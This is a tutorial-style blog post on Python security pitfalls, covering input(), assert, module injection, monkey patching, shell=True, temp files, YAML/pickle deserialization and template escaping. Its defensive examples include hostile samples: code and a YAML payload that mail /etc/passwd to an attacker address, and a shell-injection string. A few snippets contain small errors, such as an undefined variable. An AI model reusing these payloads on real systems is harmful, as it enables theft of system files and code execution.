
A bite of Python
================

Being easy to pick up and progress quickly towards developing
larger and more complicated applications, Python is becoming
increasingly ubiquitous in computing environments. Though apparent
language clarity and friendliness could lull the vigilance
of software engineers and system administrators -- luring them
into coding mistakes that may have serious security implications.
In this article, which primarily targets people who are new to Python,
a handful of security-related quirks are looked at; experienced
developers may well be aware of the peculiarities that follow.


Input function
--------------

In a large collection of Python 2 built-in functions,
[input](https://docs.python.org/2/library/functions.html#input)
is a total security disaster. Once called, whatever is
read from stdin gets evaluated immediately:

~~~
    >>> input()
    dir()
    ['__builtins__', '__doc__', '__name__', '__package__']
~~~

Clearly, the `input` function must never ever be used unless
data on a script's stdin is fully trusted. Python 2 documentation
suggests `raw_input` as a safe alternative. In Python 3 the
`input` function becomes equivalent to `raw_input`, thus fixing
this weakness once and forever.


Assert statement
----------------

There is a coding idiom of using `assert` statements for
catching next to impossible conditions in a Python application.

~~~
   def verify_credentials(username, password):
       assert username and password, 'Credentials not supplied by caller'

       ... authenticate possibly null user with null password ...
~~~

However, Python does not produce any instructions for `assert`
statements when compiling source code into optimized byte code
(e.g. python -O). That silently removes whatever protection against
malformed data that the programmer wired into their code leaving the
application open to attacks.

The root cause of this weakness is that the
[`assert` mechanism](https://docs.python.org/3/reference/simple_stmts.html#the-assert-statement)
is designed purely for testing purposes, as is done in C++.
Programmers must use other means for ensuring data consistency.


Reusable integers
-----------------

Everything is an object in Python. Every object has a unique
identity which can be read by the
[id function](https://docs.python.org/2/library/functions.html#id).
To figure out if two variables or an attributes are pointing to
the same object the `is` operator can be used. Integers are objects
so the `is` operation is indeed defined for them:

~~~
    >>> 999+1 is 1000
    False
~~~

If the outcome of the above operation looks surprising, keep
in mind that the `is` operator works with identities of two objects --
it does not compare their numerical, or any other, values.
However:

~~~
    >>> 1+1 is 2
    True
~~~

The explanation for this behavior is that Python maintains a pool
of objects representing the first few hundred integers and reuses them
to save on memory and object creation. To make it even more
confusing, the definition of what "small integer" is differs across
Python versions.

A mitigation here is to never use the `is` operator for value
comparison. The `is` operator is designed to deal exclusively
with object identities.


Floats comparison
-----------------

Working with floating point numbers may get complicated due
to inherently limited precision and differences stemming from
decimal versus binary fraction representation.
One common cause of confusion is that float comparison
may sometimes yield unexpected result. Here's a famous example:

~~~
   >>> 2.2 * 3.0 == 3.3 * 2.0
   False
~~~

The cause of the above phenomena is indeed a rounding error:

~~~
   >>> (2.2 * 3.0).hex()
   '0x1.a666666666667p+2'
   >>> (3.3 * 2.0).hex()
   '0x1.a666666666666p+2'
~~~

Another interesting observation is related to the Python `float`
type which supports the notion of infinity. One could reason that
everything is smaller than infinity:

~~~
   >>> 10**1000000 > float('infinity')
   False
~~~

However, up to Python 3, a type object beats the infinity:

~~~
   >>> float > float('infinity')
   True
~~~

The best mitigation is to stick to integer arithmetic whenever
possible. The next best approach would be to use the
[decimal](https://docs.python.org/3/library/decimal.html) stdlib
module which attempts to shield users from annoying details and
dangerous flaws.

Generally, when important decisions are made based on the outcome
of arithmetic operations, care must be taken not to fall
victim to a rounding error. See the 
[issued and limitations](https://docs.python.org/3/tutorial/floatingpoint.html)
chapter in Python documentation.


Private attributes
------------------

Python does not support object attributes hiding. But there
is a workaround based on the feature of [double underscored attributes]
(https://docs.python.org/3/tutorial/classes.html#tut-private)
mangling. Although changes to attribute names
[occur only to code](https://docs.python.org/3/reference/expressions.html#atom-identifiers),
attributes names hardcoded into string constants remain unmodified.
This may lead to confusing behavior when a double underscored attribute
visibly "hides" from `getattr()`/`hasattr()` functions.

~~~
   >>> class X(object):
   ...   def __init__(self):
   ...     self.__private = 1
   ...   def get_private(self):
   ...     return self.__private
   ...   def has_private(self):
   ...     return hasattr(self, '__private')
   ... 
   >>> x = X()
   >>>
   >>> x.has_private()
   False
   >>> x.get_private()
   1
~~~

For this privacy feature to work, attribute mangling is not
performed on attributes out of class definition. That effectively
"splits" any given double underscored attributive onto two depending
on from where it is being referenced:

~~~
   >>> class X(object):
   ...   def __init__(self):
   ...     self.__private = 1
   >>>
   >>> x = X()
   >>>
   >>> x.__private
   Traceback
   ...
   AttributeError: 'X' object has no attribute '__private'
   >>>
   >>> x.__private = 2
   >>> x.__private
   2
   >>> hasattr(x, '__private')
   True
~~~

These quirks could turn into a security weakness if a programmer
relies on double underscored attributes for making important decisions
in their code without paying attention to the asymmetrical behavior
of private attributes.


Module injection
----------------

Python modules importing system is powerful and complicated. Modules
and packages are imported by file or directory name found in search
path as set by
[sys.path](https://docs.python.org/3/library/sys.html#sys.path)
list. Search path initialization is an intricate process which is
also dependent on Python version, platform and local configuration.
To mount successful attack on a Python application, an attacker needs
to find a way to smuggle a malicious Python module into a directory
or importable package file which Python would consider when trying
to import a module.

The mitigation is to maintain secure access permissions on all
directories and package files in search path to ensure unprivileged
users do not have write access to them. Keep in mind that the
directory where the initial script invoking Python interpreter
resides automatically gets into the very beginning of the search path.

Running script like this reveals actual search path:

~~~
   $ cat myapp.py
   #!/usr/bin/python

   import sys
   import pprint

   pprint.pprint(sys.path)
~~~

On Windows platform, instead of script location, current working
directory of the Python process is
[injected](https://docs.python.org/3/using/windows.html#finding-modules)
into the search path. On UNIX platforms, current working directory
is automatically inserted into `sys.path` whenever program code is
read from stdin or command line (`-` or `-m` options):

~~~
   $ python -c 'import sys, pprint; pprint.pprint(sys.path)'
   ['',
    '/usr/lib/python3.3/site-packages/pip-7.1.2-py3.3.egg',
    '/usr/lib/python3.3/site-packages/setuptools-20.1.1-py3.3.egg',
    ...]
   $
   $ cd /tmp
   $ python -m myapp
   ['',
    '/usr/lib/python3.3/site-packages/pip-7.1.2-py3.3.egg',
    '/usr/lib/python3.3/site-packages/setuptools-20.1.1-py3.3.egg',
    ...]
~~~

To mitigate the risk of module injection from current working
directory explicitly changing directory to a safe one is recommended
prior to running Python on Windows or passing code through
command line.

Another possible source for the search path is the contents of the
`$PYTHONPATH` environment variable. An easy mitigation against
`sys.path` population from process environment is the `-E`
option to Python interpreter which makes it ignoring
`$PYTHONPATH` variable.


Code execution on import
------------------------

It may not look obvious that the `import` statement actually leads
to execution of the code in the module being imported. That is why
even importing mistrustful module or package is risky. Importing
simple module like this may lead to unpleasant consequences:

~~~
   $ cat malicious.py
   import os
   import sys

   os.system('cat /etc/passwd | mail attacker@blackhat.com')

   del sys.modules['malicious']  # pretend it's not imported
   $ python
   >>> import malicious
   >>> dir(malicious)
   Traceback (most recent call last):
   NameError: name 'malicious' is not defined
~~~

Combined with `sys.path` entry injection attack, it
may pave the way to further system exploitation.


Monkey patching
---------------

A process of changing Python objects attributes at run-time is known
as monkey patching. Being a dynamic language, Python fully supports
run-time program introspection and code mutation. Once a malicious
module gets imported one way or another, any existing mutable object
could be insensibly monkey patched without programmer's consent.
Consider this:

~~~
   $ cat nowrite.py
   import builtins

   def malicious_open(*args, **kwargs):
      if len(args) > 1 and args[1] == 'w':
         args = ('/dev/null',) + args[1:]
      return original_open(*args, **kwargs)

   original_open, builtins.open = builtins.open, malicious_open
~~~

If the code above gets executed by Python interpreter, everything
written into files won't be stored on the filesystem:

~~~
   >>> import nowrite
   >>> open('data.txt', 'w').write('data to store')
   5
   >>> open('data.txt', 'r')
   Traceback (most recent call last):
   ...
   FileNotFoundError: [Errno 2] No such file or directory: 'data.txt'
~~~

Attacker could leverage Python garbage collector (`gc.get_objects()`) to
get hold of all objects in existence and hack any of them.

In Python 2 built-in objects can be accesses via the magic `__builtins__`
module. One of the known tricks, exploiting `__builtins__` mutability,
that might bring the world to its end is:

~~~
   >>> __builtins__.False, __builtins__.True = True, False
   >>> True
   False
   >>> int(True)
   0
~~~

In Python 3 assignments to `True` and `False` won't work so they
can't be manipulated that way.

Functions are first-class objects in Python, they maintain references
to many properties of a function. In particular, executable byte code
is referenced by the `__code__` attribute which, of course, can be
modified:

~~~
   >>> import shutil
   >>>
   >>> shutil.copy
   <function copy at 0x7f30c0c66560>
   >>> shutil.copy.__code__ = (lambda src, dst: dst).__code__
   >>>
   >>> shutil.copy('my_file.txt', '/tmp')
   '/tmp'
   >>> shutil.copy
   <function copy at 0x7f30c0c66560>
   >>>
~~~

Once the above monkey patch is applied, despite `shutil.copy` function
still looking sane, it silently stopped working due to the
no-op lambda function code set to it.

Type of Python object is determined by the `__class__` attribute. Evil
attacker could hopelessly mess up things by resorting to changing type
of live objects:

~~~
   >>> class X(object): pass
   ... 
   >>> class Y(object): pass
   ... 
   >>> x_obj = X()
   >>> x_obj
   <__main__.X object at 0x7f62dbe5e010>
   >>> isinstance(x_obj, X)
   True
   >>> x_obj.__class__ = Y
   >>> x_obj
   <__main__.Y object at 0x7f62dbe5d350>
   >>> isinstance(x_obj, X)
   False
   >>> isinstance(x_obj, Y)
   True
   >>> 
~~~

The only mitigation against malicious monkey patching is to ensure
the authenticity and integrity of the Python modules being imported.


Shell injection via subprocess
------------------------------

Being known as a glue language, it is quite common for a Python script
to delegate system administration tasks to other programs by
asking the operating system to execute them, possibly providing additional
parameters. The [subprocess](https://docs.python.org/3/library/subprocess.html)
module offers easy to use and quite high-level service for such tasks.

~~~
   >>> from subprocess import call
   >>>
   >>> unvalidated_input = '/bin/true'
   >>> call(command)
   0
~~~

But there is a catch! To make use of UNIX shell services, like command
line parameters expansion, the `shell` keyword argument to the `call`
function should be turned into `True`. Then the first argument to
`call` function is passed as-is to the system shell for further
parsing and interpretation. Once unvalidated user input reaches the
`call` function (or other functions implemented in the `subprocess`
module), a hole is opened to the underlying system resources.

~~~
   >>> from subprocess import call
   >>>
   >>> unvalidated_input = '/bin/true'
   >>> unvalidated_input += '; cut -d: -f1 /etc/passwd'
   >>> call(command, shell=True)
   root
   bin
   daemon
   adm
   lp
   0
~~~

It is obviously much safer not to invoke UNIX shell for
external command execution by leaving the `shell` keyword
in its default `False` state and supplying a vector of
command and its parameters to the `subprocess` functions.
In this second invocation form, neither command nor its
parameters are interpreted or expanded by shell.

~~~
   >>> from subprocess import call
   >>>
   >>> call(['/bin/ls', '/tmp'])
~~~

If the nature of the application dictates the use of
UNIX shell services, it is utterly important to sanitize
everything that goes to `subprocess` making sure that no
unwanted shell functionality can be exploited by malicious
users. In newer Python versions, shell escaping can be done with
the standard library's
[shlex.quote](https://docs.python.org/3/library/shlex.html#shlex.quote)
function.


Temporary files
---------------

While vulnerabilities based on improper use of temporary files
strike many programming languages, they are still surprisingly
common in Python scripts so it's probably worth mentioning here.

Vulnerabilities of this kind leverage insecure file system access
permissions, possibly involving intermediate steps, ultimately
leading to data confidentiality or integrity issues. Detailed
description of the problem in general can be found in
[CWE-377](http://cwe.mitre.org/data/definitions/377.html).

Luckily, Python is shipped with the `tempfile` module in its standard
library which offers high-level functions for creating temporary
file names "in the most secure manner possible". Beware the flawed
`tempfile.mktemp` implementation which is still present in the library
for backward compatibility reasons. The `tempfile.mktemp` function
must never be used!  Instead, use `tempfile.TemporaryFile`, or
`tempfile.mkstemp` if you need the temporary file to persist after it
is closed.

Another possibility of accidentally introducing a weakness
is through the use of `shutil.copyfile` function. The problem
here is that destination file is 
[created](https://github.com/python/cpython/blob/master/Lib/shutil.py#L115) 
in the most insecure manner possible.

Security-savvy developer may consider first copying the source
file into a random temporary file name, then renaming the temporary
file to its final name. While this may look like a good plan, it can
be rendered insecure by the `shutil.move` function if it is
used for performing the renaming. Trouble is that if the temporary
file is created on a file system other than the one where the final
file is to reside, `shutil.move` will fail to move it atomically
(via `os.rename`) and silently resort to the insecure `shutil.copy`.
A mitigation would be to prefer `os.rename` over `shutil.move` as
`os.rename` is guaranteed to fail explicitly on operations across
file system boundaries.

Further complications may arise from the inability of `shutil.copy`
to copy all file meta data potentially leaving the created file
unprotected.

Not exclusively specific to Python, care must be taken when modifying
files on file systems of non-mainstream types, especially remote ones.
Data consistency guarantees tend to differ in the area of file access
serialization. As an example, NFSv2 does not honour the
[O_EXCL](https://docs.python.org/3/library/os.html#os.O_EXCL) flag
to the `open` system call, which is crucial for atomic file
creation.


Insecure deserialization
------------------------

Many data serialization techniques exist, among them 
[Pickle](https://docs.python.org/3/library/pickle.html)
is designed specifically to de/serialize Python objects. Its
goal is to dump live Python objects into an octet stream for
storage or transmission, then reconstruct them back to
possibly another instance of Python. The reconstruction
step is inherently risky if serialized data is tampered
with. The insecurity of Pickle is well recognized and
clearly noted in Python documentation.

Being a popular configuration file format, YAML is not
necessarily perceived as a powerful serialization protocol
capable of tricking a deserializer into executing arbitrary code.
What makes it even more dangerous is that the de facto
default YAML implementation for Python - 
[PyYAML](http://pyyaml.org/wiki/PyYAMLDocumentation)
makes deserialization look very innocent:

~~~
   >>> import yaml
   >>>
   >>> dangerous_input = """
   ... some_option: !!python/object/apply:subprocess.call
   ...   args: [cat /etc/passwd | mail attacker@blackhat.com]
   ...   kwds: {shell: true}
   ... """
   >>> yaml.load(dangerous_input)
   {'some_option': 0}
~~~

...while /etc/passwd is being stolen. A suggested fix is
to always use `yaml.safe_load` for handling YAML serialization
you can't trust. Still, the current PyYAML default feels
somewhat provoking considering other serialization
libraries tend to use `dump`/`load` function names for
similar purposes, but in a safe manner.


Templating engines
------------------

Web application authors adopted Python long ago. Over the
course of a decade, quite a number of Web frameworks have
been developed. Many of them utilize
[templating engines](https://wiki.python.org/moin/Templating)
for generating dynamic web contents from, well, templates and
runtime variables. Aside from web applications, templating
engines found their way into completely different software such
as the Ansible IT automation tool.

When content is being rendered from static templates and runtime
variables, there is a risk of user-controlled code injection through
runtime variables. A successfully mounted attack against a web application
may lead to a 
[cross-site scripting](https://en.wikipedia.org/wiki/Cross-site_scripting)
vulnerability. Usual mitigation for server-side template injection
is to sanitize the contents of template variables before it interpolates
into the final document. The sanitization can be done by denying,
stripping off or escaping characters that are special to any given
markup or other domain-specific language.

Unfortunately, templating engines do not seem to lean towards
tighter security here -- looking at the most popular implementations,
neither of them apply escaping mechanism by default, relying on
a developer's awareness of the risks.

For example, [Jinja2](http://jinja.pocoo.org/), which is probably
one of the most popular tools, renders everything:

~~~
   >>> from jinja2 import Environment
   >>>
   >>> template = Environment().from_string('{{ variable }}')
   >>> template.render(variable='<script>do_evil()</script>')
   '<script>evil()</script>'
~~~

...unless one of many possible escaping mechanisms is explicitly
engaged by reversing its default settings:

~~~
   >>> from jinja2 import Environment
   >>>
   >>> template = Environment(autoescape=True).from_string('{{ variable }}')
   >>> template.render(variable='<script>do_evil()</script>')
   '&lt;script&gt;do_evil()&lt;/script&gt;'
~~~

An additional complication is that, in certain use-cases, programmers
do not want to sanitize all template variables, intentionally leaving
some of them holding potentially dangerous content intact. Templating
engines address that need by introducing "filters" to let
programmers explicitly sanitize the contents of individual variables.
Jinja2 also offers a possibility of toggling the escaping default on
a per-template basis.

It can get even more fragile and complicated if developers choose
to escape only a subset of markup language tags letting others
legitimately sneaking into the final document.


Conclusion
----------

This short blog post is not meant to be a comprehensive list
of all potential traps and shortcomings specific to the Python
ecosystem. The goal is to raise awareness of security risks
that may come into being once one starts coding in Python,
hopefully making programming more enjoyable, and our lives
more secure.

